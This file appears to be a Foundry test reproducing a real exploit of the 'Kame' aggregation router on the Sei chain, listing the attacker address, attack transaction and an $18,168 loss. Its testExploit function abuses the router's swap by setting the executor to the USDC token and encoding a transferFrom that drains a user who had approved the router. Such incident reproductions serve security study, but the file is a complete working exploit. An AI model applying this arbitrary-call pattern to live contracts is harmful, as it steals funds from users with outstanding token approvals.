// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

interface IAggregationRouter {
    struct SwapParams {
        address srcToken;
        address dstToken;
        uint256 amount;
        address payable executor;
        bytes executeParams;
        bytes extraData;
    }

    function swap(
        SwapParams calldata params
    ) external payable returns (uint256 returnAmount);

    event Swapped(address srcToken, address dstToken, uint256 amount, uint256 returnAmount, bytes extraData);
}

// @KeyInfo - Total Lost : 18167.880000 USD
// Attacker : https://seiscan.io//address/0xd43d0660601e613f9097d5c75cd04ee0c19e6f65
// Attack Contract : N/A
// Vulnerable Contract : https://seiscan.io//address/0x14bb98581ac1f1a43fd148db7d7d793308dc4d80
// Attack Tx : https://seiscan.io//tx/0x6150ec6b2b1b46d1bcba0cab9c3a77b5bca218fd1cdaad1ddc7a916e4ce792ec

// @Info
// Vulnerable Contract Code : https://seiscan.io//address/0x14bb98581ac1f1a43fd148db7d7d793308dc4d80#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/SupremacyHQ/status/1966909841483636849
// Hacking God : N/A
pragma solidity ^0.8.0;

contract Kame is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 167_791_783 - 1;

    address USDC = 0xe15fC38F6D8c56aF07bbCBe3BAf5708A2Bf42392;
    address syUSD = 0x059A6b0bA116c63191182a0956cF697d0d2213eC;

    //User with approval to the vulnerable contract
    address targetToTakeFrom = 0x9A9F47F38276f7F7618Aa50Ba94B49693293Ab50;
    IAggregationRouter router = IAggregationRouter(0x14bb98581Ac1F1a43fD148db7d7D793308Dc4d80);

    function setUp() public {
        vm.createSelectFork("sei", blocknumToForkFrom);
        fundingToken = USDC;
    }

    function createSwapParams(
        address tokenToUseInSwap,
        address tokenToPull,
        address targetUser
    ) internal returns (IAggregationRouter.SwapParams memory) {
        IAggregationRouter.SwapParams memory params;
        params.srcToken = tokenToUseInSwap;
        params.dstToken = tokenToUseInSwap;
        params.amount = 0;
        params.executor = payable(tokenToPull);
        //Create a transferfrom call to usdc to the router
        params.executeParams = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            targetUser,
            address(this),
            //targetUser's full balance of tokentopull
            TokenHelper.getTokenBalance(tokenToPull, targetUser)
        );
        params.extraData = hex"01";
        return params;
    }

    function testExploit() public balanceLog {
        router.swap(createSwapParams(syUSD, USDC, targetToTakeFrom));
    }
}
